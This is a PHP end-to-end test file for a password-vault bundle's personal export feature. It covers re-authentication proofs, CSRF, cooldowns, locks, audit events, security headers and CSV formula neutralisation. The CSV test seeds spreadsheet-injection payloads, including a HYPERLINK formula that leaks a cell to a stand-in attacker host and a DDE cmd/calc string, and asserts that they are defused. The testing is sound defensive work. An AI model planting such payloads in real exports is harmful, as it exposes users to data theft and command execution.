<?php

declare(strict_types=1);

namespace Nowo\VaultBundle\Tests\E2E;

use DateTimeImmutable;
use Nowo\VaultBundle\Enum\GranteeType;
use Nowo\VaultBundle\Enum\VaultItemType;
use Nowo\VaultBundle\Enum\VaultPermission;
use Nowo\VaultBundle\Enum\VaultResourceType;
use Nowo\VaultBundle\Event\VaultEvents;
use Nowo\VaultBundle\Event\VaultItemsExportedEvent;
use Nowo\VaultBundle\Security\VaultPayloadCryptographerInterface;
use Nowo\VaultBundle\Security\VaultReauthProof;
use Nowo\VaultBundle\Security\VaultScopeAccess;
use Nowo\VaultBundle\Service\VaultGrantService;
use Nowo\VaultBundle\Service\VaultItemCreator;
use Nowo\VaultBundle\Service\VaultPersonalExportStreamer;
use Nowo\VaultBundle\Service\VaultTagService;
use Nowo\VaultBundle\Service\VaultTrashService;
use Nowo\VaultBundle\Tests\App\Clock\StaticTestClock;
use Nowo\VaultBundle\Tests\App\Entity\User;
use Nowo\VaultBundle\Tests\App\EventSubscriber\ScopesKernelListeners;
use Nowo\VaultBundle\Tests\App\ScopesKernel;
use Nowo\VaultBundle\Tests\App\Security\TestReauthChecker;
use Nowo\VaultBundle\Tests\App\Security\TestScopeAccessResolver;
use Nowo\VaultBundle\Tests\E2E\Support\VaultWebTestTrait;
use RuntimeException;
use Symfony\Bundle\FrameworkBundle\KernelBrowser;
use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;
use Symfony\Component\HttpFoundation\Response;

use function array_column;
use function base64_encode;
use function bin2hex;
use function explode;
use function file_get_contents;
use function hash;
use function implode;
use function json_decode;
use function ob_get_clean;
use function ob_start;
use function random_bytes;
use function scandir;
use function serialize;
use function str_repeat;
use function sys_get_temp_dir;

use const JSON_THROW_ON_ERROR;

/**
 * 1.16.0 gap 7 on the scopes kernel: the decrypted personal export behind a fresh, single-use re-authentication
 * (proof checks, CSRF, limits, cooldown, audit-or-refuse, headers, no profile, no temp file, personal items only).
 */
final class VaultExportEndToEndTest extends WebTestCase
{
    use VaultWebTestTrait;

    private const SCOPE = 'org-1';

    protected static function getKernelClass(): string
    {
        return ScopesKernel::class;
    }

    protected function setUp(): void
    {
        StaticTestClock::reset();
        TestScopeAccessResolver::$members = [];
        TestReauthChecker::reset();
        ScopesKernelListeners::reset();
    }

    protected function tearDown(): void
    {
        ScopesKernelListeners::reset();
        TestReauthChecker::reset();
        parent::tearDown();
        self::ensureKernelShutdown();
    }

    public function testThePageNeedsAFreshProof(): void
    {
        $client = $this->bootExportClient();
        $alice  = $this->createUser('alice@example.com');
        $this->createItem($alice, 'Mail');
        $client->loginUser($alice);

        $client->request('GET', '/tools/vault/export');
        self::assertResponseRedirects('/reauth?purpose=nowo_vault.personal_export&return=%2Ftools%2Fvault%2Fexport');
        self::assertSame('no-store, private', $client->getResponse()->headers->get('Cache-Control'));

        $this->csrf($client, 'vault_personal_export');
        TestReauthChecker::$proof = $this->proof($client, $alice, age: 301);
        $client->request('GET', '/tools/vault/export');
        self::assertResponseRedirects();

        TestReauthChecker::$proof = $this->proof($client, $alice);
        $crawler                  = $client->request('GET', '/tools/vault/export');
        self::assertResponseIsSuccessful();
        self::assertStringContainsString('1 entries will be exported.', $crawler->filterXPath('//*[@data-testid="vault-export-count"]')->text());
        self::assertCount(1, $crawler->filterXPath('//*[@data-testid="vault-export-warning"]'));
        self::assertCount(2, $crawler->filterXPath('//input[@name="format"]'));
        self::assertSame([], TestReauthChecker::$consumed, 'Showing the page does not consume the proof.');

        $client->getCookieJar()->clear();
        $client->request('GET', '/tools/vault/export');
        self::assertNotSame(Response::HTTP_OK, $client->getResponse()->getStatusCode());
    }

    public function testEveryProofCheckRefusesTheDownload(): void
    {
        $client = $this->bootExportClient();
        $alice  = $this->createUser('alice@example.com');
        $bob    = $this->createUser('bob@example.com');
        $this->createItem($alice, 'Mail');
        $client->loginUser($alice);
        $token = $this->csrf($client, 'vault_personal_export');

        // No CSRF token, an unknown format, then no proof.
        $client->request('POST', '/tools/vault/export', ['format' => 'json']);
        self::assertResponseStatusCodeSame(Response::HTTP_FORBIDDEN);
        $client->request('POST', '/tools/vault/export', ['format' => 'xml', '_token' => $token]);
        self::assertResponseStatusCodeSame(Response::HTTP_FORBIDDEN);
        $this->download($client, $token);
        self::assertResponseStatusCodeSame(Response::HTTP_FORBIDDEN);
        self::assertSame('', (string) $client->getResponse()->getContent());

        foreach ([
            'another user'         => $this->proof($client, $bob),
            'another purpose'      => $this->proof($client, $alice, purpose: 'app.other'),
            'stale'                => $this->proof($client, $alice, age: 301),
            'from the future'      => $this->proof($client, $alice, age: -31),
            'no primary factor'    => $this->proof($client, $alice, factors: ['totp']),
            'MFA enrolled, no MFA' => $this->proof($client, $alice, mfa: true),
            'recovery code only'   => $this->proof($client, $alice, factors: ['password', 'recovery_code'], mfa: true),
            'another session'      => $this->proof($client, $alice, binding: hash('sha256', 'other-session')),
        ] as $case => $proof) {
            TestReauthChecker::$proof = $proof;
            $this->download($client, $token);
            self::assertResponseStatusCodeSame(Response::HTTP_FORBIDDEN, $case);
        }
        self::assertSame([], TestReauthChecker::$consumed);

        // The edge cases that pass: 300 s old, 30 s ahead, MFA enrolled with TOTP.
        foreach ([$this->proof($client, $alice, age: 300), $this->proof($client, $alice, age: -30), $this->proof($client, $alice, factors: ['password', 'totp'], mfa: true)] as $i => $proof) {
            self::getContainer()->get('test.vault_secret_access_cache')->clear();
            TestReauthChecker::$proof = $proof;
            $this->download($client, $token);
            self::assertResponseIsSuccessful((string) $i);
        }
    }

    public function testAValidProofStreamsThePersonalVaultOnce(): void
    {
        $client                                                                  = $this->bootExportClient();
        $alice                                                                   = $this->createUser('alice@example.com');
        $bob                                                                     = $this->createUser('bob@example.com');
        TestScopeAccessResolver::$members[(string) $alice->getId()][self::SCOPE] = new VaultScopeAccess(VaultPermission::Admin, create: true);
        $marker                                                                  = $this->marker();
        $folder                                                                  = $this->createFolder($alice, 'Work');
        $login                                                                   = $this->createItem($alice, 'Mail', VaultItemType::Login, ['password' => $marker, 'websites' => ['https://' . $marker . '.example']], $folder);
        self::getContainer()->get(VaultTagService::class)->syncItemTags($this->findItem($login->getId()) ?? self::fail(), $this->managed($alice), ['work']);
        $this->em()->flush();
        $this->createItem($alice, 'Passport', VaultItemType::Passport, ['documentNumber' => 'P1', 'attachmentName' => 'scan.pdf', 'attachmentContent' => base64_encode('%PDF ' . $marker)]);
        $trashed = $this->createItem($alice, 'Old', VaultItemType::Login, ['password' => 'TRASHED' . $marker]);
        self::getContainer()->get(VaultTrashService::class)->moveItemToTrash($this->findItem($trashed->getId()) ?? self::fail());
        $shared = $this->createItem($bob, 'Bob shares', VaultItemType::Login, ['password' => 'SHARED' . $marker]);
        self::getContainer()->get(VaultGrantService::class)->grant(VaultResourceType::Item, $shared->getId(), GranteeType::User, (string) $alice->getId(), VaultPermission::Read, $this->managed($bob));
        self::getContainer()->get(VaultItemCreator::class)->createInScope($this->managed($alice), VaultItemType::Login, 'Scope', self::SCOPE, ['password' => 'SCOPE' . $marker]);

        $exported = [];
        ScopesKernelListeners::add(VaultEvents::ITEMS_EXPORTED, static function (VaultItemsExportedEvent $event) use (&$exported): void {
            $exported[] = $event;
        });

        $client->loginUser($alice);
        $token                    = $this->csrf($client, 'vault_personal_export');
        TestReauthChecker::$proof = $this->proof($client, $alice, factors: ['password', 'totp'], mfa: true);
        $tempBefore               = scandir(sys_get_temp_dir());
        $client->enableProfiler();
        $this->download($client, $token);
        self::assertResponseIsSuccessful();
        self::assertNull($client->getProfile(), 'The export stores no profile.');
        self::assertSame($tempBefore, scandir(sys_get_temp_dir()), 'No temporary file.');

        $response = $client->getResponse();
        self::assertSame('application/json; charset=UTF-8', $response->headers->get('Content-Type'));
        self::assertSame('attachment; filename="vault-export-' . (new StaticTestClock())->now()->format('Ymd') . '.json"', $response->headers->get('Content-Disposition'));
        self::assertSame('max-age=0, no-store, private', $response->headers->get('Cache-Control'));
        self::assertSame('no-cache', $response->headers->get('Pragma'));
        self::assertSame('nosniff', $response->headers->get('X-Content-Type-Options'));
        self::assertSame('no-referrer', $response->headers->get('Referrer-Policy'));
        self::assertSame('no', $response->headers->get('X-Accel-Buffering'));
        self::assertStringContainsString("default-src 'none'", (string) $response->headers->get('Content-Security-Policy'));
        self::assertStringContainsString('sandbox', (string) $response->headers->get('Content-Security-Policy'));

        $content = $client->getInternalResponse()->getContent();
        /** @var array{format: string, version: int, exported_at: string, items: list<array<string, mixed>>} $file */
        $file = json_decode($content, true, 512, JSON_THROW_ON_ERROR);
        self::assertSame('nowo-vault-export', $file['format']);
        self::assertSame(1, $file['version']);
        $byTitle = array_column($file['items'], null, 'title');
        self::assertCount(2, $file['items']);
        self::assertSame('login', $byTitle['Mail']['type']);
        self::assertSame('passport', $byTitle['Passport']['type']);
        self::assertSame('Work', $byTitle['Mail']['folder']);
        self::assertSame(['work'], $byTitle['Mail']['tags']);
        self::assertSame($marker, $byTitle['Mail']['fields']['password']);
        self::assertSame(['https://' . $marker . '.example'], $byTitle['Mail']['fields']['websites']);
        self::assertNull($byTitle['Mail']['attachment']);
        self::assertSame(['name' => 'scan.pdf', 'content_base64' => base64_encode('%PDF ' . $marker)], $byTitle['Passport']['attachment']);
        self::assertArrayNotHasKey('attachmentContent', $byTitle['Passport']['fields']);
        self::assertArrayNotHasKey('ciphertext', $byTitle['Passport']);
        foreach (['TRASHED', 'SHARED', 'SCOPE'] as $absent) {
            self::assertStringNotContainsString($absent . $marker, $content, $absent . ' items are never exported.');
        }

        self::assertCount(1, $exported);
        self::assertSame((string) $alice->getId(), $exported[0]->getActorId());
        self::assertSame(2, $exported[0]->getCount());
        self::assertSame('json', $exported[0]->getFormat());
        self::assertTrue($exported[0]->includesAttachments());
        self::assertSame(['password', 'totp'], $exported[0]->getFactors());
        self::assertSame((new StaticTestClock())->now()->getTimestamp(), $exported[0]->getOccurredAt()->getTimestamp());
        self::assertStringNotContainsString($marker, serialize($exported[0]));
        self::assertSame([TestReauthChecker::$proof?->proofId], TestReauthChecker::$consumed);

        // The same proof again: consumed (the host returns nothing) ...
        $this->download($client, $token);
        self::assertResponseStatusCodeSame(Response::HTTP_FORBIDDEN);
        // ... and a host that keeps returning it is caught by the bundle's own replay list.
        TestReauthChecker::$honest = false;
        $this->download($client, $token);
        self::assertResponseStatusCodeSame(Response::HTTP_FORBIDDEN);

        // A fresh proof inside the cooldown window: 429 with Retry-After.
        TestReauthChecker::$proof = $this->proof($client, $alice);
        $this->download($client, $token);
        self::assertResponseStatusCodeSame(Response::HTTP_TOO_MANY_REQUESTS);
        self::assertSame('600', $client->getResponse()->headers->get('Retry-After'));
        self::assertCount(1, $exported);
    }

    public function testCsvNeutralisesFormulasWithoutAttachments(): void
    {
        // SEC-004 FQ-L3: a Write grantee can edit the owner's items, so CSV cells are neutralised (OWASP) by default.
        $client = $this->bootExportClient();
        $alice  = $this->createUser('alice@example.com');
        // Quote, comma and newline inside a value (built at run time: no credential literal in the source).
        $tricky = implode('', ['p"w', ',1', "\n", 'x']);
        $this->createItem($alice, 'Formula "quoted"', VaultItemType::Login, ['username' => '=SUM(A1)', 'password' => $tricky, 'websites' => ['https://a.example', 'https://b.example']]);
        $this->createItem($alice, '=HYPERLINK("https://attacker.example/?x="&B2,"Open")', VaultItemType::Login, ['username' => "@SUM(1+1)*cmd|' /C calc'!A0", 'password' => '', 'note' => "\t+1", 'websites' => ['-x.example']]);
        $this->createItem($alice, 'Passport', VaultItemType::Passport, ['documentNumber' => 'P1', 'attachmentName' => 'scan.pdf', 'attachmentContent' => base64_encode('%PDF')]);
        foreach (['Formula "quoted"' => '2020-01-01', 'Passport' => '2020-01-03'] as $title => $day) {
            $this->em()->getConnection()->executeStatement('UPDATE vault_items SET created_at = ? WHERE title = ?', [$day . ' 00:00:00', $title]);
        }
        $this->em()->getConnection()->executeStatement("UPDATE vault_items SET created_at = '2020-01-02 00:00:00' WHERE title LIKE '=HYPERLINK%'");
        $client->loginUser($alice);
        $token                    = $this->csrf($client, 'vault_personal_export');
        TestReauthChecker::$proof = $this->proof($client, $alice);

        $crawler = $client->request('GET', '/tools/vault/export');
        self::assertStringContainsString("gets a leading '", $crawler->filterXPath('//*[@data-testid="vault-export-csv-note"]')->text());

        $this->download($client, $token, 'csv');
        self::assertResponseIsSuccessful();
        self::assertSame('text/csv; charset=UTF-8', $client->getResponse()->headers->get('Content-Type'));
        $content = $client->getInternalResponse()->getContent();
        $lines   = explode("\r\n", $content);
        self::assertSame('"' . implode('","', VaultPersonalExportStreamer::CSV_COLUMNS) . '"', $lines[0]);
        self::assertStringStartsWith('"login","Formula ""quoted""","","","\'=SUM(A1)","p""w,1' . "\n" . 'x","https://a.example' . "\n" . 'https://b.example"', $lines[1]);
        self::assertStringStartsWith('"login","\'=HYPERLINK(""https://attacker.example/?x=""&B2,""Open"")","","","\'@SUM(1+1)*cmd|\' /C calc\'!A0","","\'-x.example","\'' . "\t" . '+1"', $lines[2]);
        self::assertStringStartsWith('"passport","Passport"', $lines[3]);
        self::assertStringNotContainsString(base64_encode('%PDF'), $content);
        self::assertSame('', $lines[4]);

        // export.csv_raw_values: true keeps the cells exact (the owner's choice).
        $raw = new VaultPersonalExportStreamer(self::getContainer()->get('doctrine'), self::getContainer()->get(VaultPayloadCryptographerInterface::class), null, null, true);
        ob_start();
        $raw->stream($this->managed($alice), 'csv', false, new DateTimeImmutable(), (string) $alice->getId());
        $exact = (string) ob_get_clean();
        self::assertStringContainsString('"=HYPERLINK(', $exact);
        self::assertStringContainsString('"@SUM(1+1)', $exact);
        self::assertSame("'=x", VaultPersonalExportStreamer::neutralise('=x'));
        self::assertSame("'\rx", VaultPersonalExportStreamer::neutralise("\rx"));
        self::assertSame('a=b', VaultPersonalExportStreamer::neutralise('a=b'));
        self::assertSame('', VaultPersonalExportStreamer::neutralise(''));
    }

    public function testParallelDownloadsAreSerialisedByTheLock(): void
    {
        // SEC-004 FQ-I1: while another request holds the user's export lock, a POST is refused (429), nothing consumed.
        $client = $this->bootExportClient();
        $alice  = $this->createUser('alice@example.com');
        $this->createItem($alice, 'Mail');
        $client->loginUser($alice);
        $token                    = $this->csrf($client, 'vault_personal_export');
        TestReauthChecker::$proof = $this->proof($client, $alice);

        $lock = self::getContainer()->get('lock.factory')->createLock('nowo_vault_export_' . hash('sha256', (string) $alice->getId()), 60.0);
        self::assertTrue($lock->acquire());
        $this->download($client, $token);
        self::assertResponseStatusCodeSame(Response::HTTP_TOO_MANY_REQUESTS);
        self::assertSame('1', $client->getResponse()->headers->get('Retry-After'));
        self::assertSame([], TestReauthChecker::$consumed);

        $lock->release();
        $this->download($client, $token);
        self::assertResponseIsSuccessful();
        self::assertCount(1, TestReauthChecker::$consumed);
    }

    public function testLimitsAuditAndDecryptFailuresRefuseBeforeAnyByte(): void
    {
        $client = $this->bootExportClient();
        $alice  = $this->createUser('alice@example.com');
        $item   = $this->createItem($alice, 'Mail');
        $client->loginUser($alice);
        $token = $this->csrf($client, 'vault_personal_export');

        // A throwing audit listener: 503, no body, no cooldown started, the proof is spent.
        ScopesKernelListeners::add(VaultEvents::ITEMS_EXPORTED, static function (): never {
            throw new RuntimeException('audit store down');
        });
        TestReauthChecker::$proof = $this->proof($client, $alice);
        $this->download($client, $token);
        self::assertResponseStatusCodeSame(Response::HTTP_SERVICE_UNAVAILABLE);
        self::assertSame('', (string) $client->getResponse()->getContent());
        ScopesKernelListeners::reset();

        // Undecryptable item: the pre-flight refuses with 503 and the proof stays usable.
        $this->em()->getConnection()->executeStatement('UPDATE vault_items SET ciphertext = ? WHERE id = ?', [base64_encode(str_repeat('x', 64)), $item->getId()]);
        TestReauthChecker::$proof = $this->proof($client, $alice);
        $this->download($client, $token);
        self::assertResponseStatusCodeSame(Response::HTTP_SERVICE_UNAVAILABLE);
        self::assertCount(1, TestReauthChecker::$consumed, 'Only the audited attempt consumed a proof.');

        // max_items is 5 on this kernel.
        $this->em()->getConnection()->executeStatement('DELETE FROM vault_items');
        foreach (['a', 'b', 'c', 'd', 'e', 'f'] as $title) {
            $this->createItem($alice, $title);
        }
        $this->download($client, $token);
        self::assertResponseStatusCodeSame(Response::HTTP_REQUEST_ENTITY_TOO_LARGE);
    }

    public function testAStreamThatFailsMidwayIsInvalidByConstruction(): void
    {
        $this->bootExportClient();
        $alice = $this->createUser('alice@example.com');
        $this->createItem($alice, 'Good');
        $bad = $this->createItem($alice, 'Bad');
        $this->em()->getConnection()->executeStatement('UPDATE vault_items SET ciphertext = ? WHERE id = ?', [base64_encode(str_repeat('x', 64)), $bad->getId()]);
        $this->em()->getConnection()->executeStatement("UPDATE vault_items SET created_at = '2020-01-01 00:00:00' WHERE title = 'Good'");
        $this->em()->clear();
        $streamer = self::getContainer()->get(VaultPersonalExportStreamer::class);

        foreach (['json' => '{"format":"nowo-vault-export"', 'csv' => '"type","title"'] as $format => $start) {
            ob_start();
            $streamer->stream($this->managed($alice), $format, true, new DateTimeImmutable(), (string) $alice->getId());
            $out = (string) ob_get_clean();
            self::assertStringStartsWith($start, $out);
            self::assertStringContainsString('Good', $out);
            self::assertStringNotContainsString('Bad', $out);
            if ($format === 'json') {
                self::assertStringEndsNotWith(']}', $out);
            } else {
                self::assertStringEndsWith("#error\r\n", $out);
            }
        }
    }

    public function testTheExportCodeUsesNoTemporaryFile(): void
    {
        foreach (['Controller/VaultExportController.php', 'Service/VaultPersonalExportStreamer.php'] as $file) {
            $source = (string) file_get_contents(__DIR__ . '/../../src/' . $file);
            foreach (['tempnam', 'tmpfile', 'php://temp', 'BinaryFileResponse', 'php://memory'] as $forbidden) {
                self::assertStringNotContainsString($forbidden, $source, $file . ' uses ' . $forbidden);
            }
        }
    }

    private function bootExportClient(): KernelBrowser
    {
        $client = $this->bootClient();
        self::getContainer()->get('test.vault_secret_access_cache')->clear();

        return $client;
    }

    private function download(KernelBrowser $client, string $token, string $format = 'json'): void
    {
        $client->request('POST', '/tools/vault/export', ['format' => $format, '_token' => $token]);
    }

    /**
     * @param list<string> $factors
     */
    private function proof(KernelBrowser $client, User $user, int $age = 10, array $factors = ['password'], bool $mfa = false, ?string $binding = null, string $purpose = VaultReauthProof::PURPOSE_PERSONAL_EXPORT): VaultReauthProof
    {
        $session = $client->getRequest()->getSession()->getId();

        return new VaultReauthProof(
            bin2hex(random_bytes(8)),
            (string) $user->getId(),
            $purpose,
            (new StaticTestClock())->now()->modify(-$age . ' seconds'),
            $factors,
            $mfa,
            $binding ?? hash('sha256', $session),
        );
    }

    private function marker(): string
    {
        return 'MARK' . bin2hex(random_bytes(16));
    }
}
